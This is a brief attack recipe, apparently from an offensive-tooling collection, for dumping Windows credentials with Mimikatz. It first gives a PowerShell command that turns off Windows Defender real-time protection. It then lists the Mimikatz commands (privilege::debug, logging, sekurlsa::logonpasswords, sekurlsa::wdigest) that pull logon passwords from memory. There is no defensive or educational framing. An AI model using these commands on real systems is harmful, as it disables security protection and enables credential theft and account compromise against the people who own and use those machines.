# Credential Grabbing with Mimikatz

**If you find that this attack is not working, you may need to disable Windows Defender. This can be done by opening PowerShell as an Administrator and running the following command:**
`Set-MpPreference -DisableRealtimeMonitoring $true`

This attack uses Mimikatz to grab credentials via the command line. The Mimikatz commands are: 
- `privilege::debug`
- `log log.txt`
- `sekurlsa::logonpasswords`
- `sekurlsa::wdigest`